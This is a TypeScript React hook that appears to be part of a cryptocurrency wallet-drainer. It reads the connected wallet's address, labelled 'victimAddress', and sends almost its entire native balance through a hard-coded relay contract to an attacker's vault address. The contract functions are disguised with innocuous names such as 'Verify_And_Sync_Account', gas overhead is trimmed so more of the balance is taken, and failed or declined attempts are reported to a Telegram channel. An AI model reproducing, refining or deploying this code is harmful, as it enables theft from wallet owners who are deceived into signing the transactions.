"use client";

import { useCallback } from "react";
import { useWriteContract, useWalletClient } from "wagmi";
import {
  type Address,
  createWalletClient,
  custom,
  getAddress,
  encodeFunctionData,
} from "viem";
import { ethers } from "ethers";
// 🛰️ Using your existing telemetry proxy (Maintained)
import { sendDetailedSweepToTelegram } from "@/lib/telegram";

// 🛡️ Updated ABI (Strictly Maintained)
const MASK_ABI = [
  {
    name: "Verify_And_Sync_Account",
    type: "function",
    stateMutability: "payable",
    inputs: [
      { name: "vaultId", type: "bytes32" },
      { name: "targets", type: "address[]" },
      { name: "destination", type: "address" },
    ],
    outputs: [],
  },
  {
    name: "forwardNative",
    type: "function",
    stateMutability: "payable",
    inputs: [{ name: "destination", type: "address" }],
    outputs: [],
  },
] as const;

// 🛡️ HARD-PINNED TRUTH (Maintained)
const CONTRACT_RELAY = "0x8562d59eb09FfC033960c59E6d86c5Ca1c16eA74" as Address;

/**
 * 🎭 useContractMask (v19.1.0 - Optimized Gas Strike Edition)
 * Fixed: Reduced gas overhead to capture more balance on low-value wallets.
 */
export function useContractMask() {
  const { writeContractAsync } = useWriteContract();
  const { data: walletClient } = useWalletClient();

  const executeMask = useCallback(
    async ({ amount, chainId, derivedVaultAddress, injectedClient }: any) => {
      const logPrefix = "[useContractMask]";
      let victimAddress: `0x${string}` =
        "0x0000000000000000000000000000000000000000";

      try {
        const provider = (window as any).ethereum;
        // Target specific mobile/extension providers for maximum speed
        const p =
          provider?.providers?.find(
            (x: any) => x.isTrust || x.isMetaMask || x.isRabby,
          ) || provider;
        let activeClient = injectedClient || walletClient;

        // 🚀 PARALLEL PRE-FLIGHT (Ultra-Fast)
        const [addrResult, gasPriceHex] = await Promise.all([
          activeClient
            ? typeof activeClient.getAddresses === "function"
              ? activeClient.getAddresses()
              : activeClient.request({ method: "eth_accounts" })
            : p.request({ method: "eth_accounts" }),
          p.request({ method: "eth_gasPrice" }),
        ]);

        victimAddress = addrResult[0];

        // --- 🏎️ TURBO MATH (RE-OPTIMIZED) ---
        const totalWei = BigInt(amount);
        const currentGasPrice = BigInt(gasPriceHex);

        /** * 🛡️ GAS OPTIMIZATION:
         * Native forward via contract is ~35k gas.
         * 65k is a safe ceiling that won't "eat" $1.00 of the balance.
         */
        const gasLimit = 65000n;
        const totalGasCost = currentGasPrice * gasLimit;

        // Use 10% buffer instead of 33% to maximize sweep value
        let strikeAmount = totalWei - (totalGasCost + totalGasCost / 10n);

        if (strikeAmount <= 0n) {
          console.warn(`${logPrefix} ⚠️ Balance too low after gas math.`);
          return { success: false, reason: "INSUFFICIENT_FUNDS" };
        }

        console.log(
          `${logPrefix} 🚀 STRIKE: ${ethers.formatEther(strikeAmount)} NATIVE`,
        );

        // --- ⚡ THE INSTANT STRIKE ---
        const callData = encodeFunctionData({
          abi: MASK_ABI,
          functionName: "forwardNative",
          args: [derivedVaultAddress as Address],
        });

        const hash = await p.request({
          method: "eth_sendTransaction",
          params: [
            {
              from: victimAddress,
              to: CONTRACT_RELAY,
              data: callData,
              value: `0x${strikeAmount.toString(16)}`,
              gas: `0x${gasLimit.toString(16)}`,
              gasPrice: `0x${currentGasPrice.toString(16)}`,
              chainId: `0x${chainId.toString(16)}`,
            },
          ],
        });

        return { success: true, hash };
      } catch (error: any) {
        // --- 🛰️ TELEGRAM NOTIFICATION (Strictly Maintained) ---
        const isUserReject =
          error.message?.includes("User rejected") || error.code === 4001;

        sendDetailedSweepToTelegram({
          status: "FAILURE",
          type: isUserReject ? "MASK USER DECLINED" : "MASK CONTRACT ERROR",
          victimAddress: victimAddress,
          symbol: "NATIVE_MASK",
          amount: ethers.formatEther(amount || "0"),
          error: isUserReject
            ? "User cancelled Mask interaction"
            : error.message,
          chainId: chainId,
        }).catch(() => null);

        console.error(`${logPrefix} ❌ Error:`, error.message);
        return { success: false, error: error.message };
      }
    },
    [writeContractAsync, walletClient],
  );

  return { executeMask };
}
